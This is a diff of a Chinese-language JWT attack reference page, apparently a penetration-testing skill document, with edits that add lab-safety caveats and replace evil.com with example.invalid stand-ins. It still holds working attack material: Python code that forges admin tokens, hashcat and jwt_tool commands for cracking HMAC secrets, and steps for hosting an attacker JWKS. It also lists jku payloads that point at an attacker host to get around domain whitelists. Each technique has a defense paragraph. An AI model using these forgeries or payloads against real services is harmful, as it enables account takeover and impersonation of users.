@@ -74,7 +74,7 @@ curl -s -H "Authorization: Bearer {FORGED_JWT}" \
   "https://{TARGET}/api/admin/dashboard"
 
 # 检查是否获得管理员权限
-# 200 OK = 攻击成功
+# HTTP 200不是提权证明；比较合成管理员资源的实际授权结果与普通令牌/无令牌对照
 # 401/403 = 服务端正确拒绝none算法
 ```
 **语法解析：**
@@ -160,13 +160,9 @@ forged_payload = {
     "exp": 1999999999
 }
 
-# 将算法从RS256切换为HS256
-forged_token = jwt.encode(
-    forged_payload,
-    public_key,        # RSA公钥作为HMAC密钥
-    algorithm="HS256"  # 改为HMAC算法
-)
-print(forged_token)
+# 历史算法混淆示意：现代PyJWT会拒绝把非对称PEM公钥作为HMAC密钥。
+# 不把该历史调用伪称为当前库可运行攻击；验证目标版本/密钥类型与预期拒绝。
+
 ```
 **语法解析：**
 - `jwt.encode` — PyJWT编码函数 _function_
@@ -194,17 +190,17 @@ python3 jwt_tool.py {TOKEN} -X k -pk pubkey.pem
 Header: {
   "alg": "RS256",
   "typ": "JWT",
-  "jku": "https://evil.com/.well-known/jwks.json"
+  "jku": "https://collector.example.invalid/.well-known/jwks.json"
 }
 
-# 在evil.com上托管攻击者生成的JWKS
+# 在collector.example.invalid上托管攻击者生成的JWKS
 # 服务端会从攻击者URL获取公钥进行验证
 openssl genrsa -out attacker_key.pem 2048
 openssl rsa -in attacker_key.pem -pubout > attacker_pub.pem
 ```
 **语法解析：**
 - `"jku"` — JWK Set URL——指定公钥来源 _header_
-- `evil.com` — 攻击者控制的密钥托管服务器 _domain_
+- `collector.example.invalid` — 攻击者控制的密钥托管服务器 _domain_
 - `openssl genrsa` — 生成攻击者自己的RSA密钥对 _command_
 
 **WAF/EDR 绕过变体：**
@@ -259,7 +255,7 @@ echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
 # {"alg":"HS256"}
 
 # 确认是HMAC对称算法才可爆破
-# HS256 / HS384 / HS512 = 可爆破
+# HS256 / HS384 / HS512 = 可离线验证候选密钥；足够随机的密钥不意味着可行破解
 # RS256 / ES256 = 不可直接爆破密钥
 ```
 **语法解析：**
@@ -279,7 +275,7 @@ hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
 # 掩码暴力破解(8位数字密钥)
-hashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d
+hashcat -m 16500 -a 3 jwt.txt '?d?d?d?d?d?d?d?d' --runtime=60
 ```
 **语法解析：**
 - `-m 16500` — hashcat JWT模式 _parameter_
@@ -307,7 +303,8 @@ python3 jwt_tool.py {TOKEN} -C -d common_jwt_secrets.txt
 ```
 import jwt
 
-secret = "cracked_secret_key"
+import os
+secret = os.environ["AUTHORIZED_SYNTHETIC_JWT_SECRET"]
 
 forged = jwt.encode(
     {"user": "admin", "role": "superadmin", "exp": 1999999999},
@@ -351,9 +348,9 @@ application-secret
 
 **概述：** JWT HMAC密钥爆破是针对使用对称签名算法(HS256/HS384/HS512)的JWT系统的攻击。由于HMAC算法使用共享密钥进行签名和验证，如果密钥强度不足(短密码、常见词汇、默认值)，攻击者可以通过字典攻击或暴力破解还原密钥，然后用该密钥伪造任意JWT令牌实现身份冒充。
 
-**漏洞原理：** 漏洞条件：(1)JWT使用HS256等HMAC算法；(2)签名密钥为弱密码(如secret、123456、公司名等)；(3)密钥未定期轮转；(4)使用jwt.io等工具的默认示例密钥(your-256-bit-secret)上线。根据JWT规范建议，HS256密钥应至少256位(32字节)随机值，但实际中大量系统使用简短的人类可读密码。hashcat可在消费级GPU上每秒测试数十亿个HS256密钥。
+**漏洞原理：** 漏洞条件：(1)JWT使用HS256等HMAC算法；(2)签名密钥为弱密码(如secret、123456、公司名等)；(3)密钥未定期轮转；(4)使用jwt.io等工具的默认示例密钥(your-256-bit-secret)上线。根据JWT规范建议，HS256密钥应至少256位(32字节)随机值，但实际中大量系统使用简短的人类可读密码。hashcat可在消费级GPU上速率依赖算法、硬件、实现和输入，必须测量，不能给出通用吞吐量。
 
-**利用方法：** 利用流程：(1)从登录响应或Cookie中获取有效JWT样本；(2)解码确认使用HS256/384/512算法；(3)使用hashcat -m 16500 + 大字典(rockyou.txt)进行GPU加速爆破；(4)或使用jwt_tool -C -d快速测试常见弱密钥；(5)破解成功后用该密钥签名任意Payload的JWT；(6)RTX 4090可在数分钟内跑完rockyou字典(1400万条)。
+**利用方法：** 利用流程：(1)从登录响应或Cookie中获取有效JWT样本；(2)解码确认使用HS256/384/512算法；(3)使用hashcat -m 16500 + 大字典(rockyou.txt)进行GPU加速爆破；(4)或使用jwt_tool -C -d快速测试常见弱密钥；(5)破解成功后用该密钥签名任意Payload的JWT；(6)不得未测量就承诺某GPU或字典的完成时间。
 
 **防御措施：** 防御方案：(1)使用至少256位的密码学安全随机密钥(openssl rand -hex 32)；(2)优先使用非对称算法(RS256/ES256)避免密钥共享问题；(3)定期轮转JWT签名密钥；(4)禁止使用默认/示例密钥上线；(5)实施JWT过期时间(exp)和黑名单机制限制泄露令牌的影响范围。
 
@@ -377,7 +374,7 @@ _利用JWT Header中的jku(JWK Set URL)或x5u(X.509 URL)参数，将密钥来源
 echo "{JWT_HEADER}" | base64 -d | jq  # security-allowlist: SEC008
 
 # 常见原始Header
-{"alg":"RS256","typ":"JWT","jku":"https://target.com/.well-known/jwks.json"}
+{"alg":"RS256","typ":"JWT","jku":"https://target.example.invalid/.well-known/jwks.json"}
 
 # 检查JWKS端点
 curl -s "https://{TARGET}/.well-known/jwks.json" | jq
@@ -399,8 +396,10 @@ import json, base64
 private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 public_key = private_key.public_key()
 
+# 私钥仅写入私有实验目录；公开HTTP目录只放jwks.json，绝不放私钥。
+import os
 # 导出PEM格式
-with open("attacker_private.pem", "wb") as f:
+with os.fdopen(os.open("attacker_private.pem", os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600), "wb") as f:
     f.write(private_key.private_bytes(
         serialization.Encoding.PEM,
         serialization.PrivateFormat.PKCS8,
@@ -414,7 +413,8 @@ jwks = {"keys": [{"kty": "RSA", "kid": "attacker-key-1",
     "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, "big")).rstrip(b"=").decode(),
     "use": "sig", "alg": "RS256"}]}
 
-with open("jwks.json", "w") as f:
+os.makedirs("public-jwks", mode=0o700, exist_ok=True)
+with open("public-jwks/jwks.json", "w") as f:
     json.dump(jwks, f)
 ```
 **语法解析：**
@@ -426,8 +426,8 @@ with open("jwks.json", "w") as f:
 > 托管JWKS文件并用攻击者私钥签名JWT，jku指向攻击者服务器
 ```
 # 在攻击者服务器托管jwks.json
-python3 -m http.server 8080
-# http://evil.com:8080/jwks.json
+python3 -m http.server 8080 --bind 127.0.0.1 --directory public-jwks
+# http://collector.example.invalid:8080/jwks.json
 
 import jwt
 
@@ -439,13 +439,13 @@ forged = jwt.encode(
     {"user": "admin", "role": "admin", "exp": 1999999999},
     attacker_key,
     algorithm="RS256",
-    headers={"jku": "http://evil.com:8080/jwks.json", "kid": "attacker-key-1"}
+    headers={"jku": "http://collector.example.invalid:8080/jwks.json", "kid": "attacker-key-1"}
 )
 print(forged)
 ```
 **语法解析：**
 - `python3 -m http.server` — 快速HTTP文件服务 _command_
-- `"jku": "http://evil.com:8080/jwks.json"` — jku指向攻击者的JWKS _header_
+- `"jku": "http://collector.example.invalid:8080/jwks.json"` — jku指向攻击者的JWKS _header_
 - `"kid": "attacker-key-1"` — 匹配JWKS中的kid _json_
 
 **4. 验证攻击**
@@ -456,7 +456,7 @@ curl -s -H "Authorization: Bearer {FORGED_JWT}" \
 
 # 服务端流程：
 # 1. 解析JWT Header中的jku URL
-# 2. 从evil.com获取JWKS公钥
+# 2. 从collector.example.invalid获取JWKS公钥
 # 3. 用攻击者公钥验证签名——通过!
 # 4. 信任Payload中的admin身份
 ```
@@ -470,19 +470,19 @@ curl -s -H "Authorization: Bearer {FORGED_JWT}" \
 > 利用开放重定向、子域名接管、URL混淆绕过jku域名白名单
 ```
 # 开放重定向绕过域名白名单
-{"jku": "https://target.com/redirect?url=https://evil.com/jwks.json"}
+{"jku": "https://target.example.invalid/redirect?url=https://collector.example.invalid/jwks.json"}
 
 # 子域名接管
 {"jku": "https://abandoned.target.com/.well-known/jwks.json"}
 
 # URL混淆
-{"jku": "https://target.com@evil.com/jwks.json"}
-{"jku": "https://evil.com#target.com/jwks.json"}
-{"jku": "https://evil.com/.well-known/jwks.json?.target.com"}
+{"jku": "https://target.example.invalid@collector.example.invalid/jwks.json"}
+{"jku": "https://collector.example.invalid#target.com/jwks.json"}
+{"jku": "https://collector.example.invalid/.well-known/jwks.json?.target.com"}
 ```
 **语法解析：**
 - `redirect?url=` — 利用开放重定向跳转到攻击者域名 _technique_
-- `target.com@evil.com` — URL用户名混淆——实际访问evil.com _technique_
+- `target.com@collector.example.invalid` — URL用户名混淆——实际访问collector.example.invalid _technique_
 
 
 **概述：** JKU(JWK Set URL)和X5U(X.509 URL)是JWT Header中的可选参数，用于指定签名验证密钥的来源URL。如果服务端在验证JWT时从Header中的jku/x5u获取公钥而未限制URL来源，攻击者可将该参数指向自己控制的服务器，让服务端使用攻击者的公钥验证攻击者签名的JWT，从而实现完美的令牌伪造。
@@ -494,3 +494,13 @@ curl -s -H "Authorization: Bearer {FORGED_JWT}" \
 **防御措施：** 防御措施：(1)禁用jku/x5u Header参数，密钥来源硬编码在服务端配置中；(2)如必须使用jku，实施严格的URL白名单且不允许重定向跟随；(3)将JWKS公钥固定(pinning)在服务端配置中而非动态获取；(4)实施kid与已知密钥的映射，不接受未知kid；(5)定期审计JWT库配置确保不信任客户端提供的密钥来源。
 
 ---
+
+## 验证边界与版本要求
+
+遵守顶层SKILL.md的逐命令授权。仅使用自有合成令牌和授权账户；实际令牌/密钥不要粘贴到在线解码器、聊天、命令历史或报告，生成的伪造令牌仅在隔离实验保存。Base64url解码需处理URL安全字符和缺失填充；本文base64 -d短样本不构成通用解码器，更不验证签名。
+
+alg值区分大小写，None/NONE仅用于错误实现的负例。支持none、发现JWKS或获得TLS证书公钥本身不是认证缺陷；TLS证书公钥未必是JWT签名密钥。OIDC jwks_uri从可信发行方发现文档获取，不存在所有产品固定使用/.well-known/jwks.json的要求。jku/x5u只在错误信任客户端密钥来源时构成链路，禁止从未知主机下载或跟随重定向；网络取钥还需SSRF防护、大小/超时上限。
+
+本页混合shell/Python片段需分开保存、安装并固定已审查依赖；不是单一可执行脚本。私钥目录与公开JWKS目录必须隔离，HTTP例子绑定loopback；远程实验需另行批准并配置受控TLS服务，不能为使载荷工作而暴露私钥。离线破解须限定自有样本、字典/时间预算，不得把算法名称或未破解结果报告为弱密钥证明。验证器需固定算法/密钥类型、可信iss/aud及所需exp/nbf等声明。
+
+参考：[PyJWT API](https://pyjwt.readthedocs.io/en/stable/api.html)。未签发/提交令牌、启动HTTP服务或运行破解。
